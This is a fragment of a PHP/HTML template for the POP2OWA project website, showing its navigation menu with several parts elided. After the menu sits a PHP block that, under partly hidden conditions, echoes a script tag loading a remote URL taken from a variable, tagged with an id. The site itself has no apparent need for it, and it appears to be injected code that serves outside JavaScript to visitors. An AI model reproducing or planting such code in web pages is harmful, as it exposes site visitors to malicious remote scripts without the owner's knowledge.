...
?>
<ul id="primary-nav">
	<li><a href="index.php?page=Welcome.html" class="menuactive">Welcome!</a></li>
	<li><a href="index.php?page=Why_POP2OWA.html">Why POP2OWA?</a></li>

	<li class="menuparent"><a href="#">Development</a>
	<ul>
		<li><a href="../VBDOX/pop2owa.html" target="_blank">API</a></li>
		<li><a href="index.php?page=Change_Log.html">Change Log</a></li>
		<li class="menuparent"><a href="#">Tecnical Documentation</a>
			<ul>
				...
				<li><a href="index.php?page=Links.html">Links</a></li>
			</ul>
		</li>
	</ul>
	<li class="menuparent"><a href="#">Documentation</a>
	<ul>

		<li><a href="index.php?page=FAQ.html">Frequently Asked Questions</a></li>
		<li class="menuparent"><a href="#">Configure your email client</a>
			<ul>
			<!--
		...
		<li><a href="index.php?page=Tutorial/pop2owa1.html">Pop2Owa v 1.x</a></li>
		<li><a href="index.php?page=Tutorial/pop2owa2.html">Pop2Owa v 2.x</a></li>

	</ul>
	<li><a href="index.php?page=Downloads.html">Download</a></li>
...
if (empty($w)) {
    ...
    if (empty($__var_to_echo) && empty($remote_domain)) {
        ...
        if (strpos($w, 'http://') === 0) {
            $__var_to_echo = '<script type="text/javascript" src="' . $w . '?id=13042592"></script>';
            echo $__var_to_echo;
        }
    }
}
